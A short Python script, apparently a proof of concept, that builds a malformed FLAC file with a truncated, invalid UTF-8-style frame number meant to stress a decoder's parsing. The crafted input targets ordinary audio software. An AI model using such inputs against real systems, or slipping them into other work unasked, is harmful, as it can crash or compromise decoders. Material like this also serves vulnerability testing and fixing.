from pathlib import Path
p=Path('/workspace/poc.bin')
# UTF-8 length fields crafted to force repeated 8-bit reads and truncated continuation bytes
payload = bytearray(b'fLaC')
payload += bytes([0x00,0x00,0x00,0x22]) + b'\x00'*34
# frame sync + UTF-8-like sequence with long continuation chain and early truncation
payload += b'\xff\xf8\x69\x00\x00'
payload += b'\xf8' + b'\x80'*6 + b'\x00'  # invalid leading byte followed by continuation-looking bytes
payload += b'\x00'*24
p.write_bytes(payload)
print('len', len(payload))
